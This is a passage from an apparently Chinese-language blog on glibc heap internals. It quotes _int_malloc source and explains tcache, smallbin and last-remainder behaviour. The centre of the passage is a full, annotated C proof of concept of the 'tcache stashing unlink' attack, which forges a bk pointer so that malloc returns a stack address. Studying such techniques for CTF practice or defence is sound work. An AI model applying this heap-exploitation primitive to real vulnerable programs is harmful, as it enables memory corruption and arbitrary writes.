chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">		  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">		    malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">         bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">         (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">         that fits is selected.</span></span><br><span class="line"><span class="comment">         The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">         The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">         when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      ++idx;</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      block = idx2block (idx);</span><br><span class="line">      <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">      bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (;; )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">          <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                    <span class="keyword">goto</span> use_top;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">              bit = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">          <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">              assert (bit != <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">          victim = last (bin);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">          <span class="keyword">if</span> (victim == bin)</span><br><span class="line">            &#123;</span><br><span class="line">              av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">              assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* unlink */</span></span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		    set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">		  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">		    malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">                  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                    av-&gt;last_remainder = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<blockquote>
<p>另外一版流程：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Tokameine/article/details/119482061">https://blog.csdn.net/Tokameine/article/details/119482061</a></p>
</blockquote>
<h1 id="tcache-stashing-unlink"><a href="#tcache-stashing-unlink" class="headerlink" title="tcache stashing unlink"></a>tcache stashing unlink</h1><p>tcache_bins，指针指向chunk + 0x10(fd)，主要由以下代码确定，用fd与 bk指向 key和next</p>
<p>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</p>
<p> /* Mark this chunk as “in the tcache” so the test in _int_free will</p>
<p>   detect a double free. */</p>
<p> e-&gt;key = tcache;</p>
<p> e-&gt;next = tcache-&gt;entries[tc_idx];</p>
<p>其他像fastbins,unsortbins,smallbins,largebins均指向chunk。</p>
<p> calloc()是不走tcache的。无论tcache有无chunk，都会走到_int_malloc()中。</p>
<blockquote>
<p>calloc的分配不从tcache bin里取chunk，calloc会遍历fastbin、small bin、large  bin，如果在tcache bin里，对应的size的bin不为空，则会将这些bin的chunk采用头插法插入到tcache bin里。</p>
<p>calloc不会从tcache bin里取空闲的chunk，而是从fastbin里取，取完后，和malloc一样，如果fastbin里还有剩余的chunk，则全部放到对应的tcache bin里取，采用头插法.</p>
</blockquote>
<p>在_int_malloc()中，tcache有这样一段逻辑：</p>
<blockquote>
<p>设需求的size为n个字节；<br>如果n大小的tcache不满( 小于7 )，并且有2个以上nb大小的freed chunk 在smallbin中;<br>在_int_malloc(av, n)过程中，会尝试把剩下的n大小的smallbin放到tcache中。</p>
<p>fastbin也会</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes) &#123;</span><br><span class="line">...</span><br><span class="line">	<span class="keyword">if</span> (in_smallbin_range (nb)) &#123;</span><br><span class="line">	...</span><br><span class="line">	    <span class="keyword">if</span> ((victim = last (bin)) != bin) &#123;</span><br><span class="line">	    ...</span><br><span class="line">	    	 <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">             stash them in the tcache.  */</span></span><br><span class="line">          <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">          <span class="comment">//如果tchace不满</span></span><br><span class="line">          <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123;</span><br><span class="line">              mchunkptr tc_victim;</span><br><span class="line">              <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">              <span class="comment">// tcache不满且smallbin还有剩，则进入循环</span></span><br><span class="line">              <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                     &amp;&amp; (tc_victim = last (bin)) != bin) &#123;</span><br><span class="line">                  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>) &#123;</span><br><span class="line">                  <span class="comment">//bk是攻击者控制的，故bck是目标地址附近的内存。这里没有double link check</span></span><br><span class="line">                      bck = tc_victim-&gt;bk;</span><br><span class="line">                      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">                      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena (tc_victim);</span><br><span class="line">                      bin-&gt;bk = bck;</span><br><span class="line">                      <span class="comment">// 一个目标地址的写操作</span></span><br><span class="line">                      bck-&gt;fd = bin;</span><br><span class="line">                      tcache_put (tc_victim, tc_idx);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="tcache-smashing-unlink"><a href="#tcache-smashing-unlink" class="headerlink" title="tcache_smashing_unlink"></a>tcache_smashing_unlink</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;<span class="comment">//每一个8字节</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_var起始地址：%p\n&quot;</span>,stack_var);</span><br><span class="line">    <span class="comment">//stack_var起始地址：0x7fffffffde10</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;首先，让我们为 fake _ chunk-&gt; bk 写一个可写地址，以绕过 glibc 中的 bck-&gt; fd = bin。这里我们选择 stack _ var [2]作为假 bk。之后我们可以看到 * (fake _ chunk-&gt; bk + 0x10) ，它是 stack _ var [4] ，在攻击之后是 libc addr。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="comment">//You can see the value of fake_chunk-&gt;bk is:0x7fffffffde20</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="comment">//Also, let&#x27;s see the initial value of stack_var[4]:(nil)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;<span class="comment">//free 2 4-9 避免相邻物理块在unsortedbin中合并。</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line">    <span class="comment">//由unsortedbin变成了smallbin，因为没有这个大小的chunk所以进行合并，但是他们在unsortedbin中的物理位置还不相邻于是只能把unsortedbin放入smallbin，大小都是0xa0这个大小，包括头部，依然不够用户的需求。这个大小包含在smallbin的大小中，发现smallbin没有可用的chunk于是调用consolidate函数对fastbin进行合并，但是这里fastbin为空于是失败，接着进行对unsortedbin判断，如果有一个chunk够大能够切割分配，也分配，但是大小不够，所以也失败。于是开始便利unsortedbin，如果有chunk与当前所需大小一致分配，但是都比0xa0小，所以失败。到这一步，会把当前遍历的chunk放入smallbin或者largebin中合适的位置（根据大小），遍历完了发现没有刚好匹配的chunk，就去看比当前bin索引大的smallbin或者largebin中有没有空闲chunk来分配，但在这里没有，于是尝试从topchunk分配，可以从动态调试中看到，topchunk变小了。所以最新的chunk的来源是topchunk，而且unsortedbin列表中的内容都被整理放入合适大小的smallbin和largebin中。</span></span><br><span class="line">    <span class="comment">//如果topchunk还失败了，此时fastbin中还有chunk，就再进行合并，合并完没有可以分配的，最终会调用sysmallocs函数向系统申请内存。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="comment">//腾出俩tcachebin90的位置</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">在_int_malloc()中，tcache有这样一段逻辑：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&gt; 设需求的size为n个字节；</span></span><br><span class="line"><span class="comment">&gt; 如果n大小的tcache不满( 小于7 )，并且有2个以上n大小的freed chunk 在smallbin中;</span></span><br><span class="line"><span class="comment">&gt; 在_int_malloc(av, n)过程中，会尝试把剩下的n大小的smallbin放到tcache中。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);<span class="comment">//直接进入smallbin申请空间，此时的情况是tcache不满、smallbin有两个freechunk，则会返回给用户一个，另外一个放入tcachebin中.smallbin是先进先出，在还没有calloc的时候small--c70--290--|3d0--de10|把290分配给用户然后因为tachebin不满，所以把这个内容| |甩进tachebin中，于是第一个tache就是我们的栈指针，再进行一个malloc就会把栈指针交付给用户。</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>






<h2 id="各个chunk的大小"><a href="#各个chunk的大小" class="headerlink" title="各个chunk的大小"></a>各个chunk的大小</h2><p>tcachebin64位下size范围：0x20-0x410</p>
<p>fastbin最大值128字节–0x80</p>
<p>smallbin：小于1024字节（0x400）的chunk称之为small chunk</p>
<p>largebin：大于等于1024字节（0x400）的chunk称之为large chunk</p>
<h2 id="先进先出？先进后出？"><a href="#先进先出？先进后出？" class="headerlink" title="先进先出？先进后出？"></a>先进先出？先进后出？</h2><p>tcache,largebin,unsorted bin为<em>先进后出</em>,fastbin,<em>smallbin</em>为先进先出</p>
<h2 id="tcache-unlink"><a href="#tcache-unlink" class="headerlink" title="tcache_unlink"></a>tcache_unlink</h2><blockquote>
<p>目的是使用feee破坏全局chunk0_ptr变量来实现任意内存写入。</p>
</blockquote>
<h3 id="谁会产生last-remainder"><a href="#谁会产生last-remainder" class="headerlink" title="谁会产生last remainder?"></a>谁会产生last remainder?</h3><p>top chunk切割不会</p>
<p>在bin中的切割（剩余部分）会产生last remainder 并且会被放入unsorted bin中。</p>
<p>切割 smallbin largebin （不会切割fastbin  ini_malloc()的执行顺序就不允许了）</p>
<p>切割在for大循环中有写出：</p>
